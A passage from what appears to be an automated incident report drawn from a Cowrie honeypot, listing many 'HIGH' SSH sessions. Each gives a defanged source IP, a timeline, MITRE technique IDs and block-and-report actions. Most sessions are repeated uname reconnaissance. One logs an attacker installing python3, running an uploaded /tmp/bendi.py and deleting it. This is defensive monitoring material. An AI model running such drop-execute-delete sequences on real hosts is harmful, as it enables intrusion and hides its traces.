| `2026-09-05 17:36:42` | `cowrie.command.input` |
| `2026-09-05 17:36:42` | `cowrie.log.closed` |
| `2026-09-05 17:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b248956055e

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-05 17:36 |
| **Last Seen** | 2026-09-05 17:38 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:36:49` | `cowrie.session.connect` |
| `2026-09-05 17:36:49` | `cowrie.client.version` |
| `2026-09-05 17:36:49` | `cowrie.client.kex` |
| `2026-09-05 17:36:49` | `cowrie.login.success` |
| `2026-09-05 17:36:50` | `cowrie.session.file_upload` |
| `2026-09-05 17:36:51` | `cowrie.session.params` |
| `2026-09-05 17:36:51` | `cowrie.command.input` |
| `2026-09-05 17:36:51` | `cowrie.command.input` |
| `2026-09-05 17:36:51` | `cowrie.command.input` |
| `2026-09-05 17:36:51` | `cowrie.command.failed` |
| `2026-09-05 17:36:51` | `cowrie.log.closed` |
| `2026-09-05 17:36:52` | `cowrie.session.params` |
| `2026-09-05 17:36:52` | `cowrie.command.input` |
| `2026-09-05 17:36:52` | `cowrie.log.closed` |
| `2026-09-05 17:36:52` | `cowrie.session.params` |
| `2026-09-05 17:36:52` | `cowrie.command.input` |
| `2026-09-05 17:36:52` | `cowrie.log.closed` |
| `2026-09-05 17:36:53` | `cowrie.session.params` |
| `2026-09-05 17:36:53` | `cowrie.command.input` |
| `2026-09-05 17:36:53` | `cowrie.command.failed` |
| `2026-09-05 17:36:53` | `cowrie.command.failed` |
| `2026-09-05 17:37:54` | `cowrie.session.params` |
| `2026-09-05 17:37:54` | `cowrie.command.input` |
| `2026-09-05 17:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a7aa45e24ec

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:36 |
| **Last Seen** | 2026-09-05 17:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:36:55` | `cowrie.session.connect` |
| `2026-09-05 17:36:55` | `cowrie.client.version` |
| `2026-09-05 17:36:55` | `cowrie.client.kex` |
| `2026-09-05 17:36:55` | `cowrie.login.success` |
| `2026-09-05 17:36:56` | `cowrie.session.params` |
| `2026-09-05 17:36:56` | `cowrie.command.input` |
| `2026-09-05 17:36:56` | `cowrie.log.closed` |
| `2026-09-05 17:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf822a2371c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:37 |
| **Last Seen** | 2026-09-05 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:37:09` | `cowrie.session.connect` |
| `2026-09-05 17:37:09` | `cowrie.client.version` |
| `2026-09-05 17:37:10` | `cowrie.client.kex` |
| `2026-09-05 17:37:10` | `cowrie.login.success` |
| `2026-09-05 17:37:10` | `cowrie.session.params` |
| `2026-09-05 17:37:10` | `cowrie.command.input` |
| `2026-09-05 17:37:10` | `cowrie.log.closed` |
| `2026-09-05 17:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73f9f0258756

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:37 |
| **Last Seen** | 2026-09-05 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:37:23` | `cowrie.session.connect` |
| `2026-09-05 17:37:23` | `cowrie.client.version` |
| `2026-09-05 17:37:23` | `cowrie.client.kex` |
| `2026-09-05 17:37:23` | `cowrie.login.success` |
| `2026-09-05 17:37:24` | `cowrie.session.params` |
| `2026-09-05 17:37:24` | `cowrie.command.input` |
| `2026-09-05 17:37:24` | `cowrie.log.closed` |
| `2026-09-05 17:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d5c0e74cc4b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:37 |
| **Last Seen** | 2026-09-05 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:37:37` | `cowrie.session.connect` |
| `2026-09-05 17:37:37` | `cowrie.client.version` |
| `2026-09-05 17:37:37` | `cowrie.client.kex` |
| `2026-09-05 17:37:38` | `cowrie.login.success` |
| `2026-09-05 17:37:38` | `cowrie.session.params` |
| `2026-09-05 17:37:38` | `cowrie.command.input` |
| `2026-09-05 17:37:38` | `cowrie.log.closed` |
| `2026-09-05 17:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1a009ef7d34

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:37 |
| **Last Seen** | 2026-09-05 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:37:52` | `cowrie.session.connect` |
| `2026-09-05 17:37:52` | `cowrie.client.version` |
| `2026-09-05 17:37:52` | `cowrie.client.kex` |
| `2026-09-05 17:37:52` | `cowrie.login.success` |
| `2026-09-05 17:37:52` | `cowrie.session.params` |
| `2026-09-05 17:37:52` | `cowrie.command.input` |
| `2026-09-05 17:37:52` | `cowrie.log.closed` |
| `2026-09-05 17:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-796db4126a84

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:38 |
| **Last Seen** | 2026-09-05 17:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:38:06` | `cowrie.session.connect` |
| `2026-09-05 17:38:06` | `cowrie.client.version` |
| `2026-09-05 17:38:06` | `cowrie.client.kex` |
| `2026-09-05 17:38:06` | `cowrie.login.success` |
| `2026-09-05 17:38:06` | `cowrie.session.params` |
| `2026-09-05 17:38:06` | `cowrie.command.input` |
| `2026-09-05 17:38:06` | `cowrie.log.closed` |
| `2026-09-05 17:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ec77f80b93

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:38 |
| **Last Seen** | 2026-09-05 17:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:38:20` | `cowrie.session.connect` |
| `2026-09-05 17:38:20` | `cowrie.client.version` |
| `2026-09-05 17:38:20` | `cowrie.client.kex` |
| `2026-09-05 17:38:20` | `cowrie.login.success` |
| `2026-09-05 17:38:21` | `cowrie.session.params` |
| `2026-09-05 17:38:21` | `cowrie.command.input` |
| `2026-09-05 17:38:21` | `cowrie.log.closed` |
| `2026-09-05 17:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f179a7f4a099

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:38 |
| **Last Seen** | 2026-09-05 17:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:38:34` | `cowrie.session.connect` |
| `2026-09-05 17:38:34` | `cowrie.client.version` |
| `2026-09-05 17:38:34` | `cowrie.client.kex` |
| `2026-09-05 17:38:34` | `cowrie.login.success` |
| `2026-09-05 17:38:35` | `cowrie.session.params` |
| `2026-09-05 17:38:35` | `cowrie.command.input` |
| `2026-09-05 17:38:35` | `cowrie.log.closed` |
| `2026-09-05 17:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6ba02e1d964

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:38 |
| **Last Seen** | 2026-09-05 17:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:38:48` | `cowrie.session.connect` |
| `2026-09-05 17:38:48` | `cowrie.client.version` |
| `2026-09-05 17:38:49` | `cowrie.client.kex` |
| `2026-09-05 17:38:49` | `cowrie.login.success` |
| `2026-09-05 17:38:49` | `cowrie.session.params` |
| `2026-09-05 17:38:49` | `cowrie.command.input` |
| `2026-09-05 17:38:49` | `cowrie.log.closed` |
| `2026-09-05 17:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eea4cb414bd2

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:39 |
| **Last Seen** | 2026-09-05 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:39:03` | `cowrie.session.connect` |
| `2026-09-05 17:39:03` | `cowrie.client.version` |
| `2026-09-05 17:39:03` | `cowrie.client.kex` |
| `2026-09-05 17:39:03` | `cowrie.login.success` |
| `2026-09-05 17:39:04` | `cowrie.session.params` |
| `2026-09-05 17:39:04` | `cowrie.command.input` |
| `2026-09-05 17:39:04` | `cowrie.log.closed` |
| `2026-09-05 17:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4b95902efef

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:39 |
| **Last Seen** | 2026-09-05 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:39:18` | `cowrie.session.connect` |
| `2026-09-05 17:39:18` | `cowrie.client.version` |
| `2026-09-05 17:39:18` | `cowrie.client.kex` |
| `2026-09-05 17:39:18` | `cowrie.login.success` |
| `2026-09-05 17:39:18` | `cowrie.session.params` |
| `2026-09-05 17:39:18` | `cowrie.command.input` |
| `2026-09-05 17:39:18` | `cowrie.log.closed` |
| `2026-09-05 17:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1361a6d4f92

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:39 |
| **Last Seen** | 2026-09-05 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:39:32` | `cowrie.session.connect` |
| `2026-09-05 17:39:32` | `cowrie.client.version` |
| `2026-09-05 17:39:32` | `cowrie.client.kex` |
| `2026-09-05 17:39:32` | `cowrie.login.success` |
| `2026-09-05 17:39:33` | `cowrie.session.params` |
| `2026-09-05 17:39:33` | `cowrie.command.input` |
| `2026-09-05 17:39:33` | `cowrie.log.closed` |
| `2026-09-05 17:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e342b06aac2

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:39 |
| **Last Seen** | 2026-09-05 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:39:47` | `cowrie.session.connect` |
| `2026-09-05 17:39:47` | `cowrie.client.version` |
| `2026-09-05 17:39:47` | `cowrie.client.kex` |
| `2026-09-05 17:39:47` | `cowrie.login.success` |
| `2026-09-05 17:39:47` | `cowrie.session.params` |
| `2026-09-05 17:39:47` | `cowrie.command.input` |
| `2026-09-05 17:39:47` | `cowrie.log.closed` |
| `2026-09-05 17:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b653cb8a136

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:40 |
| **Last Seen** | 2026-09-05 17:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:40:01` | `cowrie.session.connect` |
| `2026-09-05 17:40:01` | `cowrie.client.version` |
| `2026-09-05 17:40:01` | `cowrie.client.kex` |
| `2026-09-05 17:40:01` | `cowrie.login.success` |
| `2026-09-05 17:40:02` | `cowrie.session.params` |
| `2026-09-05 17:40:02` | `cowrie.command.input` |
| `2026-09-05 17:40:02` | `cowrie.log.closed` |
| `2026-09-05 17:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b712d9ff1cb

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:40 |
| **Last Seen** | 2026-09-05 17:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:40:16` | `cowrie.session.connect` |
| `2026-09-05 17:40:16` | `cowrie.client.version` |
| `2026-09-05 17:40:16` | `cowrie.client.kex` |
| `2026-09-05 17:40:16` | `cowrie.login.success` |
| `2026-09-05 17:40:16` | `cowrie.session.params` |
| `2026-09-05 17:40:16` | `cowrie.command.input` |
| `2026-09-05 17:40:16` | `cowrie.log.closed` |
| `2026-09-05 17:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c04ffe7822

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:40 |
| **Last Seen** | 2026-09-05 17:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:40:30` | `cowrie.session.connect` |
| `2026-09-05 17:40:30` | `cowrie.client.version` |
| `2026-09-05 17:40:30` | `cowrie.client.kex` |
| `2026-09-05 17:40:30` | `cowrie.login.success` |
| `2026-09-05 17:40:31` | `cowrie.session.params` |
| `2026-09-05 17:40:31` | `cowrie.command.input` |
| `2026-09-05 17:40:31` | `cowrie.log.closed` |
| `2026-09-05 17:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c560617ab28c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:40 |
| **Last Seen** | 2026-09-05 17:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:40:45` | `cowrie.session.connect` |
| `2026-09-05 17:40:45` | `cowrie.client.version` |
| `2026-09-05 17:40:45` | `cowrie.client.kex` |
| `2026-09-05 17:40:45` | `cowrie.login.success` |
| `2026-09-05 17:40:46` | `cowrie.session.params` |
| `2026-09-05 17:40:46` | `cowrie.command.input` |
| `2026-09-05 17:40:46` | `cowrie.log.closed` |
| `2026-09-05 17:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5487844fa48b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:41 |
| **Last Seen** | 2026-09-05 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:41:00` | `cowrie.session.connect` |
| `2026-09-05 17:41:00` | `cowrie.client.version` |
| `2026-09-05 17:41:00` | `cowrie.client.kex` |
| `2026-09-05 17:41:00` | `cowrie.login.success` |
| `2026-09-05 17:41:01` | `cowrie.session.params` |
| `2026-09-05 17:41:01` | `cowrie.command.input` |
| `2026-09-05 17:41:01` | `cowrie.log.closed` |
| `2026-09-05 17:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d30638e0214

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:41 |
| **Last Seen** | 2026-09-05 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:41:14` | `cowrie.session.connect` |
| `2026-09-05 17:41:14` | `cowrie.client.version` |
| `2026-09-05 17:41:14` | `cowrie.client.kex` |
| `2026-09-05 17:41:14` | `cowrie.login.success` |
| `2026-09-05 17:41:15` | `cowrie.session.params` |
| `2026-09-05 17:41:15` | `cowrie.command.input` |
| `2026-09-05 17:41:15` | `cowrie.log.closed` |
| `2026-09-05 17:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95909252c60b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:41 |
| **Last Seen** | 2026-09-05 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:41:29` | `cowrie.session.connect` |
| `2026-09-05 17:41:29` | `cowrie.client.version` |
| `2026-09-05 17:41:29` | `cowrie.client.kex` |
| `2026-09-05 17:41:29` | `cowrie.login.success` |
| `2026-09-05 17:41:30` | `cowrie.session.params` |
| `2026-09-05 17:41:30` | `cowrie.command.input` |
| `2026-09-05 17:41:30` | `cowrie.log.closed` |
| `2026-09-05 17:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a7c7624958b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:41 |
| **Last Seen** | 2026-09-05 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:41:44` | `cowrie.session.connect` |
| `2026-09-05 17:41:44` | `cowrie.client.version` |
| `2026-09-05 17:41:44` | `cowrie.client.kex` |
| `2026-09-05 17:41:44` | `cowrie.login.success` |
| `2026-09-05 17:41:44` | `cowrie.session.params` |
| `2026-09-05 17:41:44` | `cowrie.command.input` |
| `2026-09-05 17:41:44` | `cowrie.log.closed` |
| `2026-09-05 17:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66060078ff36

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:41 |
| **Last Seen** | 2026-09-05 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:41:58` | `cowrie.session.connect` |
| `2026-09-05 17:41:58` | `cowrie.client.version` |
| `2026-09-05 17:41:58` | `cowrie.client.kex` |
| `2026-09-05 17:41:58` | `cowrie.login.success` |
| `2026-09-05 17:41:59` | `cowrie.session.params` |
| `2026-09-05 17:41:59` | `cowrie.command.input` |
| `2026-09-05 17:41:59` | `cowrie.log.closed` |
| `2026-09-05 17:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f54a203fbf14

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:42 |
| **Last Seen** | 2026-09-05 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:42:13` | `cowrie.session.connect` |
| `2026-09-05 17:42:13` | `cowrie.client.version` |
| `2026-09-05 17:42:13` | `cowrie.client.kex` |
| `2026-09-05 17:42:13` | `cowrie.login.success` |
| `2026-09-05 17:42:13` | `cowrie.session.params` |
| `2026-09-05 17:42:13` | `cowrie.command.input` |
| `2026-09-05 17:42:14` | `cowrie.log.closed` |
| `2026-09-05 17:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7711dd456cb

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:42 |
| **Last Seen** | 2026-09-05 17:42 |
